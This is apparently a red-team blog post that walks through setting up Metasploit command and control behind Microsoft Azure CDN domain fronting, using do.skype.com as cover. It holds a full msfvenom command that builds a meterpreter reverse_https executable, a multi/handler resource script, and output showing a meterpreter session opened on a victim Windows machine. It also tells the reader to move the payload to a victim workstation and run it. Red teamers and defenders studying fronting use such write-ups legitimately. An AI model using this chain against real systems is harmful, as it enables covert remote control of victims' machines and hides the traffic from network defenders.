---
title: "Metasploit Domain Fronting With Microsoft Azure"
date: 2018-04-17T00:24:27-05:00
---

Domain fronting has been one of the biggest "new-hotnesses" of the past few years and rightly so. It helps to mask your C2 traffic behind well-known domains and does a fairly good job at keeping defenders in the dark. We've seen plenty of resources setting up domain fronting for [Empire](https://www.xorrior.com/Empire-Domain-Fronting/) and [Cobalt Strike](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/), which have definitely helped to pave the way. Domain fronting support was [finally added](https://github.com/rapid7/metasploit-framework/pull/8948) into the Metasploit Framework in late 2017 and now we're starting to see [various](https://beyondbinary.io/articles/domain-fronting-with-metasploit-and-meterpreter/) [resources](https://bitrot.sh/post/30-11-2017-domain-fronting-with-meterpreter/) to help set that up for you. 

An observation that I've made is that it seems most people like to use AWS CloudFront as their CDN of choice for domain fronting, and I'll admit I fall guilty to that. Microsoft Azure also has domain fronting capabilities in their CDN infrastructure, so in this post we'll focus on setting up Metasploit domain fronting with Azure.

## Setting Up Azure

The setup for Azure is pretty straight forward and doesn't stray too far from CloudFront, just that you're using a different system. Once in Azure, you'll want to create a CDN resource and create an endpoint for that resource.

![CDN Setup Screenshot](/images/metasploit_azure_domain_fronting/1.png)

There's a few things that we need to take special attention to here:

* **CDN Endpoint Name**: This is what is going to be in your `Host` header in the HTTP request, and what will ultimately point to your C2 infrastructure. You'll want this to be something clever sounding, maybe something to deal with marketing or banking, however you decide to conceal yourself.
* **Origin Hostname**: This is your IP address or DNS name for you C2 infrastructure. This part will *not* be revealed to your end users / blue team. It's pretty much the final piece of glue to connect the CDN to your resources and get domain working.

Now that you've got your CDN and an endpoint created, it's time to wait. It can take the better part of an hour for the endpoint to propogate throughout the CDN. While we wait, we need to make sure we update the endpoint's caching settings. The reason we do this is because we don't want the CDN to act like a *real* CDN and cache our traffic, and instead just use the CDN as a communications channel.

![CDN Cache Screenshot](/images/metasploit_azure_domain_fronting/2.png)

Change your caching and query string caching behaviors to bypass and you'll be all set.

### Finding domain frontable Azure domains

Now that your CDN is setup and propogating, we need to find a high-profile domain name to hide behind that will also work for our CDN. [@a_profligate](https://twitter.com/a_profligate) has a blog post [Finding Domain frontable Azure domains](https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html) that does a pretty good job explaining how to find a domain to front with. I'm not going to bother re-inventing the wheel here, give that article a read. For the sake of this post, I'll use `do.skype.com` as my front domain.

### Test the CDN

Before we dive into Metasploit, we need to make sure our CDN communication is properly setup. I've got Nginx setup on my C2 server for testing purposes so it should respond the same way hitting it directly and hitting it through the CDN. When hitting it through the CDN with your newly chosen frontable Azure domain, you'll want to set the `Host` header to the FQDN you created before.


```
╭─chiggins at razer in ~
╰─○ curl "https://ohnoitsascarymaliciousdomain.fun"
<h1>Hello</h1>

<p>This is hosted from Nginx.</p>

╭─chiggins at razer in ~
╰─○ curl --header "Host: something-clever.azureedge.net" "https://do.skype.com"
<h1>Hello</h1>

<p>This is hosted from Nginx.</p>
```

## Setting Up Metasploit

First things first you'll want to generate your payload. Here's the payload getting generated on my C2 host.

```
╭─root at ip-10-2-0-235 in ~/metasploit-framework
╰─± ./msfvenom -p windows/meterpreter/reverse_https LHOST=do.skype.com LPORT=443 HttpHostHeader=something-clever.azureedge.net -f exe -o /var/www/html/exploit.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 463 bytes
Final size of exe file: 73802 bytes
Saved as: /var/www/html/exploit.exe
```

Two things to take special note of here:

* **LHOST**: This is going to be the frontable domain you discovered earlier.
* **HttpHostHeader**: This new option is what will set the `Host` entry in your HTTP request. This should be set to your CDN endpoint.

For the sake of simplicity I have a resource script setup so that when I start Metasploit, it'll start up my handler with all the right options.

```
╭─root at ip-10-2-0-235 in ~/metasploit-framework
╰─± cat ~/df_azure.rc
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST do.skype.com
set LPORT 443
set HttpHostHeader something-clever.azureedge.net
set ExitOnSession false
run -j
╭─root at ip-10-2-0-235 in ~/metasploit-framework
╰─± ./msfconsole -qr ~/df_azure.rc
[*] Processing /root/df_azure.rc for ERB directives.
resource (/root/df_azure.rc)> use multi/handler
resource (/root/df_azure.rc)> set payload windows/meterpreter/reverse_https
payload => windows/meterpreter_reverse_https
resource (/root/df_azure.rc)> set LHOST do.skype.com
LHOST => do.skype.com
resource (/root/df_azure.rc)> set LPORT 443
LPORT => 443
resource (/root/df_azure.rc)> set HttpHostHeader something-clever.azureedge.net
HttpHostHeader => something-clever.azureedge.net
resource (/root/df_azure.rc)> set ExitOnSession false
ExitOnSession => false
resource (/root/df_azure.rc)> run -j
[*] Exploit running as background job 0.

[-] Handler failed to bind to 72.21.81.200:443
msf5 exploit(multi/handler) > [*] Started HTTPS reverse handler on https://0.0.0.0:443

msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                            Payload opts
  --  ----                    -------                            ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_https  https://do.skype.com:443

msf5 exploit(multi/handler) >
```

You'll notice that there's an error binding to `72.21.81.200:443`. That's because that is the IP address of `do.skype.com`, which is fine, because the handler also binds on `0.0.0.0:443` which will work out perfectly for us.

Transfer your payload onto your victim workstation and run it and you should see great success and a meterpreter shell call back!

```
[*] https://do.skype.com:443 handling request from 152.195.6.101; (UUID: 3cxijbex) Staging x86 payload (180901 bytes) ...
[*] Meterpreter session 1 opened (10.2.0.235:443 -> 152.195.6.101:38626) at 2018-04-03 21:02:31 +0000

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1RB861P
OS              : Windows 10 (Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

Because the payload utlizes both domain fromting via `do.skype.com` and HTTPS, the traffic in transit really looks like nothing out of the orginary.

![Wireshark capture of payload](/images/metasploit_azure_domain_fronting/3.png)

And there you have it -- successful domain fronting with Metasploit via Microsoft Azure! If you have any questions or comments, feel free to hit me up on Twitter [@ch1gg1ns](https://twitter.com/ch1gg1ns).
